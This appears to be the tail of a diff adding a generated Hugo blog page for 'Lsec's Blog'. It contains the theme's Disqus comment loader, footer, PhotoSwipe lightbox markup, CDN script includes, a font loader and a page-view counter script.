+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Lsec&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>���¹鵵ҳ</title>
+    
+    <script defer src="https://cn.vercount.one/js"></script>
+</head>
+<body>
+</body>
+</html>
+    </body>
+</html>
